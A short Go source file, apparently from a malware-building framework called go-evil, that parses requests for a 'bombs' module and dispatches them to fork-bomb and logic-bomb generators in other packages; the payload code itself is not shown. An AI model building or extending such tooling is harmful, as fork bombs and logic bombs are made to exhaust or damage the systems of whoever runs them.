package bombs

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/domains/bombs/fork"
	"github.com/TeamPhoneix/go-evil/domains/bombs/logical"

	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

// The main parser for the Infect domain
func Parser(function string, value string, s_json string) ([]string, string) {
	call := []string{}

	switch function {
	case "fork_bomb":
		call, s_json = fork.Bomb(value, s_json)

	case "logical_bomb":
		call, s_json = logical.Bomb(value, s_json)

	default:
		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "bombs.Parser()")

	}

	return call, s_json
}
